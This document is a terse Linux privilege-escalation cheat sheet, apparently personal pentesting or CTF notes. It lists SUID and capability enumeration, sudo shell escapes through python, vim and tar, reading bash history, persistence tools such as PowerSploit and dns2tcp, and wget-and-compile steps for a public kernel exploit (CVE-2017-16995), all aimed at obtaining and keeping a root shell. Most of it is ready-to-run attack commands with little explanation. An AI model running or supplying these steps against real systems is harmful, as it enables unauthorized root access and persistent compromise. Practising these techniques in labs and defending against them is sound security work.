
INPUT: Shell
PROCESS:
- Stablish Shell
- Privilege Escalation
- Maintain Access
TOOLS
- https://gtfobins.github.io/
OUPUT: 
- root shell



## Privilege Escalation
getcap -r / 2>/dev/null

Python Library Hijacking on Linux

[SUID] find / -perm /4000 2>/dev/null
    - [python] <python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'>
[sudo] <id; sudo -l; sudo -V>
- [vim] <sudo vim -c ':!/bin/sh'>
[WebServer]:
- [python3]: python3 module <python3 -m http.server>
[Bash]  
- [History] <cat .bash_history>
[vsftpd]
- !/bin/bash
[tar]    
    <sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh>
    <sudo install -m =xs $(which tar)
    ./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh>

find / -type f -user root -perm -u=s 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

## Maintain Access
- PowerSploit
- Weewly
- dns2tcp


[cve-2017-16995]
    wget https://www.exploit-db.com/download/45010 -O cve-2017-16995.c
    gcc --static cve-2017-16995.c -o cve-2017-16995    
